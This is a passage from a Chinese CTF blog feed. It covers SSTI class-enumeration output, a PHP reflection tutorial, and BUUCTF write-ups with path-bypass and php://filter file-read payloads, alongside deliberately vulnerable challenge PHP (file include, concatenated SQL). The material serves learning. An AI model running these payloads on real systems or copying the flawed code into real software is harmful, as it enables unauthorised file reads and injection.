&#39;__import__&#39;)</span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;compile&#39;)</span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;eval&#39;)</span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;execfile&#39;)</span><br><span class="line">(79, 21, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;__import__&#39;)</span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;compile&#39;)</span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;eval&#39;)</span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;execfile&#39;)</span><br><span class="line">----------4-----------</span><br><span class="line">(60, &#39;__import__&#39;)</span><br><span class="line">(60, &#39;file&#39;)</span><br><span class="line">(60, &#39;repr&#39;)</span><br><span class="line">(60, &#39;compile&#39;)</span><br><span class="line">(60, &#39;eval&#39;)</span><br><span class="line">(60, &#39;open&#39;)</span><br><span class="line">(60, &#39;execfile&#39;)</span><br><span class="line">进一步获取可以直接执行命令或者读取文件的类</span><br><span class="line"></span><br><span class="line">----------1-----------                                                                </span><br><span class="line">(40, &#39;file&#39;)                                                                          </span><br><span class="line">----------2-----------                                                                </span><br><span class="line">(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])   </span><br><span class="line">(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])                    </span><br><span class="line">(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])   </span><br><span class="line">(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])                    </span><br><span class="line">(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])                   </span><br><span class="line">(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])                  </span><br><span class="line">(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])                    </span><br><span class="line">(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])                   </span><br><span class="line">(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;, None)                               </span><br><span class="line">(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;, None)                               </span><br><span class="line">----------3-----------                                                                </span><br><span class="line">(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;file&#39;)                                   </span><br><span class="line">(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;eval&#39;)                                   </span><br><span class="line">(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;open&#39;)                                   </span><br><span class="line">(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;execfile&#39;)                               </span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;file&#39;)                                   </span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;eval&#39;)                                   </span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;open&#39;)                                   </span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;execfile&#39;)                               </span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;file&#39;)                                </span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;eval&#39;)                                </span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;open&#39;)                                </span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;execfile&#39;)                            </span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;file&#39;)                                        </span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;eval&#39;)                                        </span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;open&#39;)                                        </span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;execfile&#39;)                                    </span><br><span class="line">(72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)                                             </span><br><span class="line">(72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;exec&#39;)                                             </span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)                                             </span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;eval&#39;)                                             </span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;open&#39;)                                             </span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;execfile&#39;)                                         </span><br><span class="line">(77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)                                              </span><br><span class="line">(77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;exec&#39;)                                              </span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)                                              </span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;eval&#39;)                                              </span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;open&#39;)                                              </span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;execfile&#39;)                                          </span><br><span class="line">(78, 21, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)                                 </span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;file&#39;)                                 </span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;eval&#39;)                                 </span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)                                 </span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;execfile&#39;)                             </span><br><span class="line">(79, 21, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)                                 </span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;file&#39;)                                 </span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;eval&#39;)                                 </span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)                                 </span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;execfile&#39;)                             </span><br><span class="line">----------4-----------                                                                </span><br><span class="line">(60, &#39;file&#39;)                                                                          </span><br><span class="line">(60, &#39;repr&#39;)                                                                          </span><br><span class="line">(60, &#39;eval&#39;)                                                                          </span><br><span class="line">(60, &#39;open&#39;)                                                                          </span><br><span class="line">(60, &#39;execfile&#39;)</span><br></pre></td></tr></table></figure>



<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p>梳理了一遍以后，感觉其实ssti注入也不难，难的是一开始面对啥也不懂的手足无措，不知道从哪入手，现在可能还是有一些小点不是很懂，但是终于是没那么陌生了</p>
<p>参考:<a href="https://xz.aliyun.com/t/6885#toc-1">https://xz.aliyun.com/t/6885#toc-1</a><br><a href="https://www.anquanke.com/post/id/226900#h3-14">https://www.anquanke.com/post/id/226900#h3-14</a><br><a href="https://xz.aliyun.com/t/3679#toc-9">https://xz.aliyun.com/t/3679#toc-9</a><br><a href="https://xi4or0uji.github.io/2019/01/15/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#%E5%8A%A8%E6%89%8B%E5%AE%9E%E8%B7%B5">https://xi4or0uji.github.io/2019/01/15/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#%E5%8A%A8%E6%89%8B%E5%AE%9E%E8%B7%B5</a><br><a href="https://xz.aliyun.com/t/8029#toc-7">https://xz.aliyun.com/t/8029#toc-7</a><br><a href="https://www.freebuf.com/articles/network/258136.html">https://www.freebuf.com/articles/network/258136.html</a><br><a href="https://juejin.cn/post/6908600736754434056#heading-13">https://juejin.cn/post/6908600736754434056#heading-13</a></p>
]]></content>
  </entry>
  <entry>
    <title>CTF中的php反射</title>
    <url>/2021/05/15/CTF%E4%B8%AD%E7%9A%84php%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<h2 id="反射是什么？"><a href="#反射是什么？" class="headerlink" title="反射是什么？"></a><strong>反射是什么？</strong></h2><p>它是指在PHP运行状态中，扩展分析PHP程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API。反射是操纵面向对象范型中元模型的API，其功能十分强大，可帮助我们构建复杂，可扩展的应用。</p>
<p>其用途如：自动加载插件，自动生成文档，甚至可用来扩充PHP语言。</p>
<p>PHP反射api由若干类组成，可帮助我们用来访问程序的元数据或者同相关的注释交互。借助反射我们可以获取诸如类实现了那些方法，创建一个类的实例（不同于用new创建），调用一个方法（也不同于常规调用），传递参数，动态调用类的静态方法。</p>
<p>反射api是PHP内建的OOP技术扩展，包括一些类，异常和接口，综合使用他们可用来帮助我们分析其它类，接口，方法，属性，方法和扩展。这些OOP扩展被称为反射。</p>
<p>平常我们用的比较多的是 <strong>ReflectionClass类</strong> 和 <strong>ReflectionMethod类</strong>，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php&#96;&#96;class&#96; &#96;Person&#96;&#96;&#123;&#96;&#96;  &#96;&#96;&#x2F;**&#96;&#96;   &#96;&#96;* For the sake of demonstration, we&quot;re setting this private&#96;&#96;   &#96;&#96;*&#x2F;&#96;&#96;  &#96;&#96;private&#96; &#96;$_allowDynamicAttributes&#96; &#96;&#x3D; false;&#96; &#96;  &#96;&#96;&#x2F;**&#96;&#96;   &#96;&#96;* type&#x3D;primary_autoincrement&#96;&#96;   &#96;&#96;*&#x2F;&#96;&#96;  &#96;&#96;protected&#96; &#96;$id&#96; &#96;&#x3D; 0;&#96; &#96;  &#96;&#96;&#x2F;**&#96;&#96;   &#96;&#96;* type&#x3D;varchar length&#x3D;255 null&#96;&#96;   &#96;&#96;*&#x2F;&#96;&#96;  &#96;&#96;protected&#96; &#96;$name&#96;&#96;;&#96; &#96;  &#96;&#96;&#x2F;**&#96;&#96;   &#96;&#96;* type&#x3D;text null&#96;&#96;   &#96;&#96;*&#x2F;&#96;&#96;  &#96;&#96;protected&#96; &#96;$biography&#96;&#96;;&#96; &#96;  &#96;&#96;public&#96; &#96;function&#96; &#96;getId()&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;return&#96; &#96;$this&#96;&#96;-&gt;id;&#96;&#96;  &#96;&#96;&#125;&#96; &#96;  &#96;&#96;public&#96; &#96;function&#96; &#96;setId(&#96;&#96;$v&#96;&#96;)&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;$this&#96;&#96;-&gt;id &#x3D; &#96;&#96;$v&#96;&#96;;&#96;&#96;  &#96;&#96;&#125;&#96; &#96;  &#96;&#96;public&#96; &#96;function&#96; &#96;getName()&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;return&#96; &#96;$this&#96;&#96;-&gt;name;&#96;&#96;  &#96;&#96;&#125;&#96; &#96;  &#96;&#96;public&#96; &#96;function&#96; &#96;setName(&#96;&#96;$v&#96;&#96;)&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;$this&#96;&#96;-&gt;name &#x3D; &#96;&#96;$v&#96;&#96;;&#96;&#96;  &#96;&#96;&#125;&#96; &#96;  &#96;&#96;public&#96; &#96;function&#96; &#96;getBiography()&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;return&#96; &#96;$this&#96;&#96;-&gt;biography;&#96;&#96;  &#96;&#96;&#125;&#96; &#96;  &#96;&#96;public&#96; &#96;function&#96; &#96;setBiography(&#96;&#96;$v&#96;&#96;)&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;$this&#96;&#96;-&gt;biography &#x3D; &#96;&#96;$v&#96;&#96;;&#96;&#96;  &#96;&#96;&#125;&#96;&#96;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>一、通过ReflectionClass，我们可以得到Person类的以下信息：</strong></p>
<ol>
<li>常量 Contants</li>
<li>属性 Property Names</li>
<li>方法 Method Names静态</li>
<li>属性 Static Properties</li>
<li>命名空间 Namespace</li>
<li>Person类是否为final或者abstract</li>
<li>Person类是否有某个方法</li>
</ol>
<p>接下来反射它，只要把类名”Person”传递给ReflectionClass就可以了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$class&#96; &#96;&#x3D; &#96;&#96;new&#96; &#96;ReflectionClass(&#96;&#96;&#39;Person&#39;&#96;&#96;); &#96;&#96;&#x2F;&#x2F; 建立 Person这个类的反射类 &#96;&#96;$instance&#96; &#96;&#x3D; &#96;&#96;$class&#96;&#96;-&gt;newInstanceArgs(&#96;&#96;$args&#96;&#96;); &#96;&#96;&#x2F;&#x2F; 相当于实例化Person 类</span><br></pre></td></tr></table></figure>



<p><strong>1）获取属性(Properties)：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php&#96;&#96;$properties&#96; &#96;&#x3D; &#96;&#96;$class&#96;&#96;-&gt;getProperties();&#96;&#96;foreach&#96; &#96;(&#96;&#96;$properties&#96; &#96;as&#96; &#96;$property&#96;&#96;)&#96;&#96;&#123;&#96;&#96;  &#96;&#96;echo&#96; &#96;$property&#96;&#96;-&gt;getName() . &#96;&#96;&quot;\n&quot;&#96;&#96;;&#96;&#96;&#125;&#96;&#96;&#x2F;&#x2F; 输出:&#96;&#96;&#x2F;&#x2F; _allowDynamicAttributes&#96;&#96;&#x2F;&#x2F; id&#96;&#96;&#x2F;&#x2F; name&#96;&#96;&#x2F;&#x2F; biography</span><br></pre></td></tr></table></figure>

<p>默认情况下，ReflectionClass会获取到所有的属性，private 和 protected的也可以。如果只想获取到private属性，就要额外传个参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$private_properties&#96; &#96;&#x3D; &#96;&#96;$class&#96;&#96;-&gt;getProperties(ReflectionProperty::IS_PRIVATE);</span><br></pre></td></tr></table></figure>

<p>可用参数列表：</p>
<ul>
<li>ReflectionProperty::IS_STATIC</li>
<li>ReflectionProperty::IS_PUBLIC</li>
<li>ReflectionProperty::IS_PROTECTED</li>
<li>ReflectionProperty::IS_PRIVATE</li>
</ul>
<p>通过$property-&gt;getName()可以得到属性名。</p>
<p><strong>2）获取注释：</strong></p>
<p>通过getDocComment可以得到写给property的注释。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php&#96;&#96;foreach&#96; &#96;(&#96;&#96;$properties&#96; &#96;as&#96; &#96;$property&#96;&#96;)&#96;&#96;&#123;&#96;&#96;  &#96;&#96;if&#96; &#96;(&#96;&#96;$property&#96;&#96;-&gt;isProtected())&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;$docblock&#96; &#96;&#x3D; &#96;&#96;$property&#96;&#96;-&gt;getDocComment();&#96;&#96;    &#96;&#96;preg_match(&#96;&#96;&#39;&#x2F; type\&#x3D;([a-z_]*) &#x2F;&#39;&#96;&#96;, &#96;&#96;$property&#96;&#96;-&gt;getDocComment(), &#96;&#96;$matches&#96;&#96;);&#96;&#96;    &#96;&#96;echo&#96; &#96;$matches&#96;&#96;[1] . &#96;&#96;&quot;\n&quot;&#96;&#96;;&#96;&#96;  &#96;&#96;&#125;&#96;&#96;&#125;&#96;&#96;&#x2F;&#x2F; Output:&#96;&#96;&#x2F;&#x2F; primary_autoincrement&#96;&#96;&#x2F;&#x2F; varchar&#96;&#96;&#x2F;&#x2F; text</span><br></pre></td></tr></table></figure>



<p><strong>3）获取类的方法</strong></p>
<ul>
<li>getMethods()    来获取到类的所有methods。</li>
<li>hasMethod(string)  是否存在某个方法</li>
<li>getMethod(string)  获取方法</li>
</ul>
<p><strong>4）执行类的方法：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$instance&#96;&#96;-&gt;getName(); &#96;&#96;&#x2F;&#x2F; 执行Person 里的方法getName&#96;&#96;&#x2F;&#x2F; 或者：&#96;&#96;$method&#96; &#96;&#x3D; &#96;&#96;$class&#96;&#96;-&gt;getmethod(&#96;&#96;&#39;getName&#39;&#96;&#96;); &#96;&#96;&#x2F;&#x2F; 获取Person 类中的getName方法&#96;&#96;$method&#96;&#96;-&gt;invoke(&#96;&#96;$instance&#96;&#96;);       &#96;&#96;&#x2F;&#x2F; 执行getName 方法&#96;&#96;&#x2F;&#x2F; 或者：&#96;&#96;$method&#96; &#96;&#x3D; &#96;&#96;$class&#96;&#96;-&gt;getmethod(&#96;&#96;&#39;setName&#39;&#96;&#96;); &#96;&#96;&#x2F;&#x2F; 获取Person 类中的setName方法&#96;&#96;$method&#96;&#96;-&gt;invokeArgs(&#96;&#96;$instance&#96;&#96;, &#96;&#96;array&#96;&#96;(&#96;&#96;&#39;snsgou.com&#39;&#96;&#96;));</span><br></pre></td></tr></table></figure>



<p><strong>二、通过ReflectionMethod，我们可以得到Person类的某个方法的信息：</strong></p>
<ol>
<li>是否“public”、“protected”、“private” 、“static”类型</li>
<li>方法的参数列表</li>
<li>方法的参数个数</li>
<li>反调用类的方法</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php&#96;&#96;&#x2F;&#x2F; 执行detail方法 $method&#96;&#x3D; new ReflectionMethod(&#39;Person&#39;, &#39;test&#39;);&#96;&#96;if&#96; &#96;(&#96;&#96;$method&#96;&#96;-&gt;isPublic() &amp;&amp; !$method-&gt;isStatic())&#96;&#96;&#123;&#96;&#96;  &#96;&#96;echo&#96; &#96;&#39;Action is right&#39;&#96;&#96;;&#96;&#96;&#125;&#96;&#96;echo&#96; &#96;$method&#96;&#96;-&gt;getNumberOfParameters(); &#96;&#96;&#x2F;&#x2F; 参数个数&#96;&#96;echo&#96; &#96;$method&#96;&#96;-&gt;getParameters(); &#96;&#96;&#x2F;&#x2F; 参数对象数组</span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>buuctf16</title>
    <url>/2021/05/22/buuctf16/</url>
    <content><![CDATA[<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>查看源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, $_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  $guess = (<span class="keyword">string</span>) $_POST[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $message = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码分为两个部分，先说下面吧，让我们比对一个secret，看了一下，根本不可能爆破跑出来的</p>
<p>所以重点应该在上部分，说flag在config.php当中，并且还用了一个正则匹配waf掉config.php，有那种防止我们直接读取的味道，然后下面getsource中，对于我们传入的php_self也是可以直接显示的，所以猜想关键点是绕过这里<br><strong>几个点学习一下吧:</strong><br>1.$_SERVER[‘PHP_SELF’]是什么？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_SERVER[&#39;PHP_SELF&#39;] 表示当前 php 文件相对于网站根目录的位置地址，与 document root 相关。</span><br><span class="line">假设我们有如下网址，$_SERVER[‘PHP_SELF’]得到的结果分别为：</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;www.baicai.link&#x2F;index&#x2F; ：&#x2F;index&#x2F;index.php</span><br><span class="line">http:&#x2F;&#x2F;www.baicai.link&#x2F;cate&#x2F;miandan.html ：&#x2F;cate&#x2F;miandan.html</span><br><span class="line">http:&#x2F;&#x2F;www.baicai.link&#x2F;php&#x2F;index.php?test&#x3D;foo ：&#x2F;php&#x2F;index.php</span><br><span class="line">http:&#x2F;&#x2F;www.baicai.link&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo ：&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo</span><br></pre></td></tr></table></figure>

<p>所以很明显php_self是我们可控的，接下来看看能否尝试绕过正则匹配<br>就需要看看basename()有没有什么特性，比如php字符串的规则啥的~<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210523212837.png" alt="img" style="zoom:67%;"></p>
<p>在php手册中，我们发现如果路径包含对当前区域设置无效的字符，则basename()的行为未定义。</p>
<p>所以<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210523213048.png" alt="img" style="zoom:67%;"><br>接下来我们来构造一下payload:<br>我们知道phpself获取的是最后一个/后的内容，我们直接输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;config.php?source</span><br></pre></td></tr></table></figure>

<p>是不行的——这样变成我们执行的是config.php的内容<br>所以应该是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;config.php</span><br></pre></td></tr></table></figure>

<p>此时执行的index.php，获取的是config.php<br>接下来是绕过正则匹配</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;config.php&#x2F;我认为?source&#x3D;</span><br></pre></td></tr></table></figure>

<h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p>查看源码，发现file，可以打开文件，于是想到文件包含，试试伪协议读取文件，发现可以<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.baase64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//index.php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line">$file = (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]) ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,$file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//search.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">if</span>(!$row) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;&lt;p&gt;å§å:&quot;</span>.$row[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, çµè¯:&quot;</span>.$row[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, å°å:&quot;</span>.$row[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;æªæ¾å°è®¢å!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;ä¿¡æ¯ä¸å¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//change.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    $phone = 